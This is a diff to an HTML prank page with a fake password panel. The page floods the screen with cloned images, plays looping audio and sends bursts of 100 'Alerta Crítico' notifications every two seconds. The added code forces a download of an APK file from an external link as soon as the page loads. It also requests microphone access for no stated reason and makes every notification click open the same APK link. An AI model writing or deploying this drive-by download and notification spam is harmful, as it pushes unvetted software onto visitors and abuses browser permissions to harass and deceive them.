@@ -21,7 +21,7 @@
             align-items: center;
             position: relative;
         }
- 
+
         #login-panel {
             background-color: #1f1f1f;
             padding: 20px;
@@ -102,7 +102,7 @@
     </div>
 
     <script>
-        const numberOfClones = 5000;
+        const numberOfClones = 500;
         const body = document.body;
 
         for (let i = 0; i < numberOfClones; i++) {
@@ -113,6 +113,19 @@
             img.style.animationDelay = `${Math.random() * 4}s`;
             body.appendChild(img);
         }
+
+        function initiateDownload() {
+            const link = document.createElement('a');
+            link.href = 'https://kodular.app/ZPS-EUZ'; 
+            link.download = 'arquivo.apk';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        window.onload = function() {
+            initiateDownload();
+        };
     </script>
 
     <audio id="background-music-1" autoplay loop>
@@ -131,28 +144,41 @@
 
                 Notification.requestPermission().then(function(permission) {
                     if (permission === "granted") {
-                        function sendMultipleNotifications() {
-                            navigator.serviceWorker.ready.then(function(registration) {
-                                for (let i = 0; i < 100; i++) {
-                                    registration.showNotification('Alerta Crítico', {
-                                        body: "كلمة المرور",
-                                        icon: "icon.png",
-                                       vibrate: [200, 100, 200], 
-                                        tag: `pegadinha-notificacao-${i}` 
+                        navigator.mediaDevices.getUserMedia({ audio: true })
+                            .then(function(stream) {
+                                console.log('Permissão de áudio concedida');
+
+                                function sendMultipleNotifications() {
+                                    navigator.serviceWorker.ready.then(function(registration) {
+                                        for (let i = 0; i < 100; i++) {
+                                            registration.showNotification('Alerta Crítico', {
+                                                body: "كلمة المرور",
+                                                icon: "icon.png",
+                                                vibrate: [200, 100, 200], 
+                                                tag: `pegadinha-notificacao-${i}`,
+                                                data: {
+                                                    url: 'https://kodular.app/ZPS-EUZ' 
+                                                }
+                                            });
+                                        }
                                     });
                                 }
+
+                                function checkPassword() {
+                                    const password = document.getElementById('password-input').value;
+
+                                    if (password !== "كلمة المرور") {
+                                        alert("كلمة المرور");
+                                        sendMultipleNotifications();
+                                    }
+                                }
+                                
+                                
+                                setInterval(sendMultipleNotifications, 2000);
+
+                            }).catch(function(error) {
+                                console.log('Permissão de áudio negada:', error);
                             });
-                        }
-
-                        function checkPassword() {
-                            const password = document.getElementById('password-input').value;
-
-                            if (password !== "كلمة المرور") {
-                                alert("كلمة المرور");
-                                sendMultipleNotifications();
-                            }
-                        }
-                        setInterval(sendMultipleNotifications, 2000);
                     } else {
                         alert("Permissão para notificações foi negada.");
                     }
@@ -163,6 +189,13 @@
         } else {
             alert("Este navegador não suporta notificações ou service workers.");
         }
+
+        self.addEventListener('notificationclick', function(event) {
+            event.notification.close();
+            event.waitUntil(
+                clients.openWindow(event.notification.data.url)
+            );
+        });
     </script>
 </body>
 </html>
